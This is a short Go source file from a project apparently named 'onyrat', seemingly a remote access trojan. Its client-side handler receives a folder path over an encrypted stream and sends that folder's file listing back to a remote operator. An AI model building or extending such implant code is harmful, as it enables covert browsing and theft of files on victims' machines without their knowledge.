//go:build client
// +build client

package handlers

import (
	"fmt"
	"time"

	"github.com/Onyz107/onyrat/pkg/commands/files"
	"github.com/Onyz107/onyrat/pkg/network"
	"github.com/xtaci/smux"
)

func HandleList(c *network.KCPClient, stream *smux.Stream) error {
	buf := smallBufPool.Get().([]byte)
	defer smallBufPool.Put(buf)

	// Get path
	n, err := c.ReceiveEncrypted(stream, buf, 10*time.Second)
	if err != nil {
		return fmt.Errorf("failed to receive folder path: %w", err)
	}

	if err := files.SendFiles(c, string(buf[:n])); err != nil {
		return fmt.Errorf("failed to send listef file from path: %s: %w", string(buf[:n]), err)
	}

	return nil
}
